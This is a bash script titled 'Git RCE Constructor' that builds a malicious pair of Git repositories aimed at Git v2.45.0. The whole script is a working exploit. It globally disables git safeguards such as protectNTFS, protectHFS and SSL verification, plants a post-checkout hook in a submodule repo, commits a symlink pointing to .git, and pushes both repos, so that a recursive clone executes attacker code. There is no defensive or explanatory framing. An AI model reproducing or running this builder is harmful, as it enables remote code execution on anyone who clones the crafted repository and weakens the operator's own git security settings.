#!/bin/bash
set +x
error_handler(){
set +x
echo -n "Operation failed!"
read -N 1
exit -1
}
echo Git RCE Constructor v1.9.4 \(Update Mode\)
echo -e "\033]0;Git RCE Constructor v1.9.4 (Update Mode)\007"
echo Notice: You must use Git v2.45.0 for this exploit to work!
read -r -p "Main repository URL: " main_repo_path
read -r -p "Hook repository URL: " hook_repo_path
set -x
git config --global protocol.allow always ||error_handler
git config --global protocol.file.allow always ||error_handler
git config --global protocol.git.allow always ||error_handler
git config --global protocol.http.allow always ||error_handler
git config --global core.symlinks true ||error_handler
git config --global core.protectNTFS false ||error_handler
git config --global core.protectHFS false ||error_handler
git config --global core.ignoreCase true ||error_handler
git config --global core.longpaths true ||error_handler
git config --global core.fscache false ||error_handler
git config --global core.fsmonitor false ||error_handler
git config --global core.preloadIndex false ||error_handler
git config --global core.commitGraph true ||error_handler
git config --global core.multiPackIndex true ||error_handler
git config --global core.hideDotFiles false ||error_handler
git config --global http.sslVerify false ||error_handler
git config --global receive.maxInputSize 0 ||error_handler
git config --global receive.denyCurrentBranch updateInstead ||error_handler
git config --global receive.denyDeletes false ||error_handler
git config --global receive.denyDeleteCurrent false ||error_handler
git config --global receive.denyNonFastForwards false ||error_handler
if [ -z "$(git config --global user.name)" ]; then
git config --global user.name "$USERNAME"
fi
if [ -z "$(git config --global user.email)" ]; then
git config --global user.email "$USERNAME"
fi
echo Updating hook repo...
mkdir -p git_rce_hook
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_hook disable
fi
git clone --recursive "$hook_repo_path" git_rce_hook ||error_handler
cd git_rce_hook ||error_handler
git_editor=$(git config --get core.editor)
if [ -z "$git_editor" ]; then
git_editor="VIM"
fi
"$git_editor" "$PWD/scripts/hooks/post-checkout"
git add scripts/hooks/post-checkout ||error_handler
git diff --cached --quiet HEAD ||git commit -m "update-post-checkout" ||error_handler
git push origin HEAD ||error_handler
cd .. ||error_handler
echo Updating main repo...
mkdir -p git_rce_main
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_main disable
fi
git clone --no-recursive "$main_repo_path" git_rce_main ||error_handler
cd git_rce_main ||error_handler
git rm gitlnk ||error_handler
git diff --cached --quiet HEAD ||git commit -m "remove-symlink" ||error_handler
git submodule update --init --recursive ||error_handler
git submodule set-url GITLNK/modules/RCE "$hook_repo_path" ||error_handler
git -C GITLNK/modules/RCE fetch origin --prune ||error_handler
git -C GITLNK/modules/RCE remote set-head origin --auto ||error_handler
git submodule update --remote GITLNK/modules/RCE ||error_handler
git add GITLNK/modules/RCE ||error_handler
git diff --cached --quiet HEAD ||git commit -m "update-submodule" ||error_handler
git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk ||error_handler
git diff --cached --quiet HEAD ||git commit -m "add-symlink" ||error_handler
xcopy GITLNK .git //b //e //v //r //i //g //h //o //c //k //y ||error_handler
git reset --hard HEAD ||error_handler
git push origin HEAD ||error_handler
cd .. ||error_handler
echo Testing the exploit...
mkdir -p git_rce_test
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_test disable
fi
git clone --recursive "$main_repo_path" git_rce_test ||error_handler
set +x
echo All done!
echo -n "Press any key to continue . . ."
read -N 1
exit 0
